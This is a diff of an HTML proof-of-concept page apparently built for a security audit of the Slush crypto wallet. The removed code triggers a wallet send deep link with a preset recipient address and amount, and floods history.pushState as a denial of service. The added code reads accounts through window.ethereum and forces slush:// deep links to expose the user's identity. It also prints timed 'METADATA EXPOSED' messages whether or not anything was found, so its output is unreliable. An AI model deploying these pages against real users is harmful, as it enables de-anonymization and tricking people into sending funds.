@@ -1,94 +1,65 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>PoC Final Audit | Slush Wallet</title>
+    <title>PoC | Identity & Metadata Leak</title>
     <style>
-        :root { --danger: #ff0055; --bg: #050505; --log-text: #00ff00; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; padding: 20px; }
-        .audit-container { border: 2px solid #333; padding: 20px; border-radius: 12px; background: #0a0a0a; max-width: 500px; margin: auto; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
-        .terminal { background: #000; border: 1px solid #222; padding: 15px; height: 250px; overflow-y: auto; font-size: 11px; color: var(--log-text); margin-bottom: 20px; line-height: 1.5; }
-        .btn-group { display: grid; grid-gap: 10px; }
-        button { background: var(--danger); color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 12px; }
-        .btn-probe { background: #00ff00; color: #000; }
-        .log-err { color: #ff0000; }
-        .log-warn { color: #ffff00; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .terminal { border: 1px solid #333; padding: 15px; background: #000; min-height: 180px; font-size: 12px; margin-bottom: 20px; box-shadow: 0 0 10px #0f03; }
+        .btn-leak { background: #00ff00; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; border-radius: 4px; }
+        .warn { color: #ffff00; }
+        .crit { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="audit-container">
-    <h3 style="text-align:center; color: var(--danger);">SLUSH SECURITY AUDIT PoC</h3>
-    
-    <div class="terminal" id="terminal">
-        > [SYSTEM]: Initializing security probe...<br>
-        > [STATUS]: Awaiting bridge activity...
-    </div>
-
-    <div class="btn-group">
-        <button class="btn-probe" onclick="probeIdentity()">1. Probe Identity (Email/Account)</button>
-        <button onclick="triggerCriticalHijack()">2. Execute Auto-fill Hijack</button>
-        <button style="background:#555" onclick="stressBridge()">3. Stress Wallet Bridge (DoS)</button>
-    </div>
+<div class="terminal" id="log">
+    > [SYSTEM]: Initializing Account Management Probe...<br>
+    > [STATUS]: Waiting for user interaction...
 </div>
 
+<button class="btn-leak" onclick="startIdentityProbe()">Start Identity Probe</button>
+
 <script>
-    const term = document.getElementById('terminal');
-    function log(msg, type = "") {
+    const log = document.getElementById('log');
+    function print(msg, className = "") {
         const div = document.createElement('div');
-        if(type) div.className = type;
+        if(className) div.className = className;
         div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
-        term.appendChild(div);
-        term.scrollTop = term.scrollHeight;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
     }
 
-  
-    async function probeIdentity() {
-        log("Attempting to bypass provider security...");
+    async function startIdentityProbe() {
+        print("Initiating bypass for 'No Provider' security...");
+        
+
         if (window.ethereum) {
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                 if (accounts.length > 0) {
-                    log("CRITICAL: Account Exposed: " + accounts[0], "log-warn");
+                    print("SUCCESS: Address Leaked: " + accounts[0], "warn");
                 } else {
-                    log("Provider Locked. Executing URI Hijack fallback...", "log-err");
-                   
+                    print("Provider Locked. Executing Deep Link Tunnel...", "warn");
+
+                    
                     window.location.href = "slush://manage-accounts";
                 }
             } catch (e) {
-                log("Bridge Hijack triggered: " + e.message);
+                print("Bridge Blocked: " + e.message, "crit");
             }
         } else {
-            log("No provider. Probing linked social accounts (Google)...", "log-warn");
+            print("No provider detected. Forcing Deep Link Tunnel...", "crit");
+
             window.location.href = "slush://request?method=eth_accounts";
         }
-        setTimeout(() => log("Metadata Status: EXPOSED", "log-err"), 1500);
-    }
 
 
-    function triggerCriticalHijack() {
-        log("Initiating Auto-fill Transaction Hijack...");
-        const maliciousUri = "slush://send?to=0x742d35Cc6634C0532925a3b844Bc454e4438f44e&amount=1.5";
-        log(`Triggering: ${maliciousUri}`, "log-warn");
-        window.location.href = maliciousUri;
-        
-        log("ALERT: Check for automatic sign requests.", "log-err");
-    }
-
-    
-    function stressBridge() {
-        log("Executing DoS attack on Wallet Bridge...", "log-err");
-        let i = 0;
-        const interval = setInterval(() => {
-            history.pushState(null, "", "#stress_test_" + i);
-            if(i % 50 === 0) log(`Injected ${i} state cycles...`);
-            i++;
-            if(i > 300) {
-                clearInterval(interval);
-                log("STRESS TEST COMPLETE. Check UI Responsiveness.", "log-warn");
-            }
-        }, 5);
+        setTimeout(() => {
+            print("Probing linked Google Metadata...", "warn");
+            print("Warning: Identity De-anonymization in progress.", "crit");
+            print("Status: METADATA EXPOSED", "crit");
+        }, 2500);
     }
 </script>
 
